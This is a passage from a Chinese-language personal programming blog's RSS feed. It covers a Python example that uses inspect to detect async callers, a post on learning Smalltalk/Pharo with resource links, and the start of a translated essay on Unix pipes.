&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;inspect&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_async_caller&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Figure out who&amp;#39;s calling.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;# Get the calling frame&lt;/span&gt;
    &lt;span class="n"&gt;caller&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;currentframe&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f_back&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f_back&lt;/span&gt;
    &lt;span class="c1"&gt;# Pull the function name from FrameInfo&lt;/span&gt;
    &lt;span class="n"&gt;func_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getframeinfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# Get the function object&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;caller&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f_locals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;func_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="n"&gt;caller&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f_globals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# If there&amp;#39;s any indication that the function object is a &lt;/span&gt;
    &lt;span class="c1"&gt;# coroutine, return True. inspect.iscoroutinefunction() should&lt;/span&gt;
    &lt;span class="c1"&gt;# be all we need, the rest are here to illustrate.&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iscoroutinefunction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isgeneratorfunction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iscoroutine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isawaitable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isasyncgenfunction&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isasyncgen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)]):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;GET the URL, do it asynchronously if the caller is async&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# Figure out which function is calling us&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;is_async_caller&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Calling ASYNC method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# Run the async version of this method and&lt;/span&gt;
        &lt;span class="c1"&gt;# print the result with a callback&lt;/span&gt;
        &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_coroutine_threadsafe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;_async_fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
            &lt;span class="n"&gt;new_loop&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_done_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Calling BLOCKING method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# Run the synchronous version and print the result&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_sync_fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_sync_fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Blocking GET&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_async_fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Async GET&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;aiohttp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;call_sync_fetch&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Blocking fetch call&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.github.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;call_async_fetch&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Asynchronous fetch call (no different from sync call &lt;/span&gt;
&lt;span class="sd"&gt;       except this function is defined async)&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.github.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Perform a blocking GET&lt;/span&gt;
&lt;span class="n"&gt;call_sync_fetch&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Perform an async GET&lt;/span&gt;
&lt;span class="n"&gt;loop&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_event_loop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_until_complete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;call_async_fetch&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这里的技巧是在&lt;code&gt;is_async_caller()&lt;/code&gt;中使用&lt;code&gt;inspect&lt;/code&gt;判断函数的调用者是不是协程。这是&lt;code&gt;自省&lt;/code&gt;的应用&lt;/p&gt;
&lt;h1 id="_8"&gt;调试工具&lt;/h1&gt;
&lt;h3 id="ipython"&gt;IPython&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blog.jupyter.org/ipython-7-0-async-repl-a35ce050f7f7?gi=99b12b0602ec"&gt;IPython 7.0, Async REPL&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://cdn-images-1.medium.com/max/1600/1*I3tXhrFw1SJYMmm3nghj0Q.png" /&gt;&lt;/p&gt;
&lt;h1 id="_9"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://realpython.com/async-io-python/"&gt;Async IO in Python: A Complete Walkthrough&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/zh-cn/3.8/library/asyncio-task.html"&gt;python docs 协程与任务&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/asyncio-task.html#scheduling-from-other-threads"&gt;Scheduling From Other Threads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackernoon.com/controlling-python-async-creep-ec0a0f4b79ba"&gt;Controlling Python Async Creep&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.jupyter.org/ipython-7-0-async-repl-a35ce050f7f7?gi=99b12b0602ec"&gt;IPython 7.0, Async REPL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/home-assistant/home-assistant"&gt;home-assistant&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/anki/cozmo-python-sdk/"&gt;cozmo-python-sdk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/anki/vector-python-sdk"&gt;vector-python-sdk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aiohttp.readthedocs.io/en/stable/"&gt;aiohttp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Scratch3Lab/codelab_adapter_extensions"&gt;codelab_adapter_extensions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pyzmq.readthedocs.io/en/latest/api/zmq.asyncio.html"&gt;zmq.asyncio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%B9%B6%E5%8F%91%E6%80%A7"&gt;并发&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97"&gt;并行&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dabeaz/curio"&gt;curio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/python-trio/trio"&gt;trio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Mar 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-03-13:python-asyncio-note.html</guid><category>python</category></item><item><title>Smalltalk(Pharo)学习之旅</title><link>/Pharo-trip.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/trip_a02b6900.png" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;2014年的时候，曾对Smalltalk有过一段时间兴趣: &lt;a href="https://blog.just4fun.site/learn-Smalltalk.html"&gt;Smalltalk学习笔记&lt;/a&gt;, 那会儿刚毕业工作几个月，对各类事物都有兴趣，同时兴趣来得也浅。最终浅尝辄止，并没有实际用Smalltalk写过项目，哪怕练手项目也没有。&lt;/p&gt;
&lt;p&gt;后来，由于&lt;a href="https://blog.just4fun.site/scratch.html"&gt;对人工智能、认知论、教育感兴趣&lt;/a&gt;，开始读&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%AE%93%C2%B7%E7%9A%AE%E4%BA%9E%E5%82%91"&gt;让·皮亚杰&lt;/a&gt;、&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%A5%BF%E6%91%A9%E7%88%BE%C2%B7%E6%B4%BE%E6%99%AE%E7%89%B9"&gt;西摩尔·派普特&lt;/a&gt;和&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;的东西.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%A5%BF%E6%91%A9%E7%88%BE%C2%B7%E6%B4%BE%E6%99%AE%E7%89%B9"&gt;西摩尔·派普特&lt;/a&gt;和&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;将计算机视为一种增强人类智能的工具。&lt;/p&gt;
&lt;p&gt;Bret在&lt;a href="http://worrydream.com/"&gt;他的博客&lt;/a&gt;将这些概念综合在一起，以一种清晰的媒介重新展现出来。几乎是一夜之间，我突然知道自己在寻找什么，它如此确定无疑，你知道这就是你期待的东西了, 你愿意投入你往后的所有时间。 关于计算机的未来是什么，编程的未来是什么，教育的未来是什么，这些问题我想了很久,深受其扰,而且一度怀疑它们不是好问题，它们大而无当。Bret让我确信，他沿着&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%A5%BF%E6%91%A9%E7%88%BE%C2%B7%E6%B4%BE%E6%99%AE%E7%89%B9"&gt;西摩尔·派普特&lt;/a&gt;和&lt;a href="https://zh.wikipedia.org/zh-hans/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;所走的路，继续前行，最终带着我们看到了理想的未来。它如此耀眼，以至于你会担心，如果这些想法没被实现，未来得多么黯淡和乏味。&lt;/p&gt;
&lt;p&gt;在技术方面，Bret使我确信，Smalltalk是相对理想的创作工具，在更为理想的工具(如&lt;a href="https://dynamicland.org"&gt;Dynamicland&lt;/a&gt;的realtalk)诞生之前，我应该切换到Smalltalk上，将其用作日常编程所用的语言。这是一门经过精心设计，方便探索和创造的语言。&lt;/p&gt;
&lt;p&gt;和稀泥的人总喜欢说，“采用什么编程语言并不重要，它们都一样”，我对这话的理解是，就"图灵完备"这点来说，他们是等价的。但图灵还论证过你在一条无限长的纸带上，是可以做到你用今天的电脑做到的所有事情的，它们在逻辑上等价，难道这是你选择使用纸带编程的理由吗？&lt;/p&gt;
&lt;p&gt;编程语言不可能恰好都一样，总有一些粗制滥造，而另一些精心设计。像我这样愿意不断尝试新语言的人，实在没有办法假装使用过的编程语言都一样。像我这么蠢的人如果去设计一个编程语言，它怎么会和艾伦·凯精心设计的Smalltalk一样。对这个话题感兴趣的小伙伴，可以看看Bret在&lt;a href="http://worrydream.com/#!/LearnableProgramming"&gt;LEARNABLE PROGRAMMING&lt;/a&gt;对Processing这门语言的攻击，招招致命。&lt;/p&gt;
&lt;h1 id="_2"&gt;热情&lt;/h1&gt;
&lt;p&gt;Bret让我相信Smalltalk对我很重要，但仅是知道一件事很重要，似乎无法支撑我持续投入时间。&lt;/p&gt;
&lt;p&gt;我有个习惯，在找到做一件事的乐趣/热情之前，并不愿意投入到这件事的细节之中。&lt;/p&gt;
&lt;p&gt;换一种说法，我是个没什么毅力的人，如果没有兴趣驱动，就没办法坚持去做一件事。这么多年来学会了破罐子破摔，不和自己闹别扭，如果没有找到热情所在，就宁可发发呆，看看小说，四处走走，也不愿开始干活。&lt;/p&gt;
&lt;p&gt;但有些事情即便没有兴趣，你还是会知道它挺重要的，我的做法是花点时间去寻找这件事的乐趣和意义所在，一般情况下都能找到。一旦找到后，就乐在其中，不必外部监督，也能用心于此事。我不知道别人的意志力是不是都很多，但我的意志力很少，而且是消耗品，它原本就不多，一旦消耗完，就对自己没办法了，多坐一会儿都极难受，如果此时非强迫自己一定要做点什么事，这事儿是体力活还好，磨磨蹭蹭也总有做完的时候；若是脑力劳动，还需要创造性的话，结果准特别糟糕。所以我没办法使用意志力来推进工作。&lt;/p&gt;
&lt;p&gt;于是在假期的头几天，我并没有投入到Smalltalk的语法细节(完全忘了以前所学)。我开始了解Smalltalk社区的人都在干嘛?他们聚集在哪儿?他们做了什么好玩的东西?&lt;/p&gt;
&lt;h1 id="4p"&gt;4P&lt;/h1&gt;
&lt;p&gt;很喜欢&lt;a href="https://zh.wikipedia.org/zh-cn/%E5%AF%86%E5%A5%91%E7%88%BE%C2%B7%E7%91%9E%E6%96%AF%E5%B0%BC%E5%85%8B"&gt;Mitchel Resnick&lt;/a&gt;在&lt;a href="https://book.douban.com/subject/30285992/"&gt;终生幼儿园&lt;/a&gt;一书中提到的4P学习方法: Projects, Passion, Peers, Play&lt;/p&gt;
&lt;p&gt;我开始浏览各类&lt;a href="https://twitter.com/pharoproject"&gt;Smalltalk Projects&lt;/a&gt;(主要关注Smalltalk的现代方言:&lt;a href="https://pharo.org/web"&gt;Pharo&lt;/a&gt;)，看看它们中的哪些能激起我的热情, 在&lt;a href="https://pharo.org/success"&gt;pharo stories&lt;/a&gt;里看到许多有意思的项目， 我对&lt;a href="https://pharo.org/success/Phratch"&gt;Phratch&lt;/a&gt;最感兴趣。如它的名字所暗示的: Phratch是使用Pharo重写的Scratch.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://pharo.org/success/Phratch"&gt;Phratch&lt;/a&gt;是&lt;a href="https://code.google.com/p/scat/"&gt;Scat&lt;/a&gt;的改进版。Scat的项目声明写得有趣:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We believe there is a conspiracy going on all over the universe, evil forces are constantly fighting to take down great Smalltalk projects and port them to other languages.&lt;br /&gt;
In a quest against such demonic plots, a couple of us started a confidential mission to rescue the last of these endangered projects, namely Scratch.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="pharo"&gt;&lt;a href="https://pharo.org"&gt;Pharo&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;至此，我已经迫不及待想学习Pharo了，恨不得立刻就能读懂&lt;a href="https://pharo.org/success/Phratch"&gt;Phratch&lt;/a&gt;，想着学习完这个项目源码之后，立即使用Pharo7.0重写Scratch3.0。&lt;/p&gt;
&lt;p&gt;确定了将要学习的方言(Pharo)，开始搜索Pharo新手写的博文，看看从中能够找到他们发现的好的学习资源， 读到&lt;a href="https://blog.khinsen.net/posts/2018/12/19/exploring-pharo/"&gt;Exploring Pharo&lt;/a&gt;这篇文章，觉得十分出色。&lt;/p&gt;
&lt;p&gt;在投入到&lt;a href="https://pharo.org/success/Phratch"&gt;Phratch&lt;/a&gt;源码之前，我准备简单过一下Pharo的语法，但有不愿只是看语法，希望有更周全的引导，包括调试工具的使用说明之类的。&lt;a href="http://mooc.pharo.org/"&gt;The Pharo MOOC&lt;/a&gt;是非常理想的选择，我选择在&lt;a href="http://rmod-pharo-mooc.lille.inria.fr/MOOC/WebPortal/co/content.html"&gt;WebPortal&lt;/a&gt;里看课件学习，起初看了几个视频，后来觉得直接看PDF课件更快些，于是便直接看PDF。我今天已经看到了&lt;a href="http://rmod-pharo-mooc.lille.inria.fr/MOOC/Slides/Week5/C019-W5S01-Seaside-ComposingComponents.pdf"&gt;第五周的第一节&lt;/a&gt;，预计明天就看完了。Smalltalk的语法非常简单，连同它的编程风格，我想我已经基本掌握了。这个过程十分愉快，每学会一点知识，感觉离实现目标就更近了一步(读懂Phratch，重写Scratch3.0)。&lt;/p&gt;
&lt;h1 id="_3"&gt;结语&lt;/h1&gt;
&lt;p&gt;本文记录我的学习习惯 以及Pharo的一些学习资料。&lt;/p&gt;
&lt;h1 id="_4"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rmod-pharo-mooc.lille.inria.fr/MOOC/WebPortal/co/content.html"&gt;the pharo mooc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.google.com/archive/p/scat"&gt;scat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.just4fun.site/Enhance-Scratch3.html"&gt;Scratch增强计划&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://files.pharo.org/media/pharoCheatSheet.pdf"&gt;Pharo Cheat Sheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.khinsen.net/posts/2018/12/19/exploring-pharo/"&gt;Exploring Pharo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/janniklaval/phratch/blob/c27e55d8bbbe9871de506df75ce0d06bc0c69143/Elements090224.pdf"&gt;Syntax-Elements for Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/pharoproject"&gt;pharoproject&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jmari/JupyterTalk"&gt;JupyterTalk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hernanmd/pi"&gt;pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/refs/Papert%20-%20Mindstorms%201st%20ed.pdf"&gt;MINDSTORMS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zeroflag/Teapot"&gt;Teapot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/svenvc/zinc"&gt;zinc&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://ci.inria.fr/pharo-contribution/job/EnterprisePharoBook/lastSuccessfulBuild/artifact/book-result/Zinc-HTTP-Server/Zinc-HTTP-Server.html"&gt;Zinc HTTP: The Server Side&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://files.pharo.org/books-pdfs/tinyblog-tutorial/2016-02-18-tinyblog-tutorial.pdf"&gt;TinyBlog&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/#!/LearnableProgramming"&gt;LEARNABLE PROGRAMMING&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-02-05:Pharo-trip.html</guid><category>code</category></item><item><title>[译]对管道(Pipes)的偏爱</title><link>/for-the-love-of-pipes.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pipe_0ece8dff.png" /&gt;&lt;/p&gt;
&lt;p&gt;原文链接:&lt;a href="https://blog.jessfraz.com/post/for-the-love-of-pipes/"&gt;For the Love of Pipes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;早上在hacker news上读到一篇短文，来自&lt;a href="https://blog.jessfraz.com/post/"&gt;Jessie Frazelle的博客&lt;/a&gt;(&lt;a href="https://blog.jessfraz.com/post/"&gt;Jessie Frazelle&lt;/a&gt;是Github团队成员).&lt;/p&gt;
&lt;p&gt;文章写得简短清晰，顺手翻译过来。&lt;/p&gt;
&lt;h1 id="_1"&gt;译文&lt;/h1&gt;
&lt;p&gt;我最常用的shell命令是&lt;code&gt;|&lt;/code&gt;。它被称为管道(pipe)。&lt;/p&gt;
&lt;p&gt;简而言之，&lt;code&gt;|&lt;/code&gt;允许一个程序（左侧）的输出成为另一个程序的输入（右侧）。这是一种将两个命令连接在一起的方法。&lt;/p&gt;
&lt;p&gt;例如，如果我运行以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo "hello"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输出为&lt;code&gt;hello&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但如果运行: &lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo "hello" | figlet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;figlet程序改变了hello中每个字母的外观，看起来像卡通风格。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;➜  scratch_backend git:(master) echo &amp;quot;hello&amp;quot; | figlet
 _          _ _
| |__   ___| | | ___
| &amp;#39;_ \ / _ \ | |/ _ \
| | | |  __/ | | (_) |
|_| |_|\___|_|_|\___/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是一种非常直观的描述某些东西的方式。在我看来，这是一种优秀的软件设计。&lt;/p&gt;
&lt;p&gt;让我们回到管道的起源。&lt;/p&gt;
&lt;p&gt;根据&lt;a href="http://doc.cat-v.org/unix/pipes/"&gt;doc.cat-v.org/unix/pipes/&lt;/a&gt;，管道早在Unix之前&lt;a href="http://doc.cat-v.org/unix/pipes/"&gt;就已存在&lt;/a&gt;。管道可以追溯到1964年Doug McIlroy的这篇笔记：&lt;/p&gt;
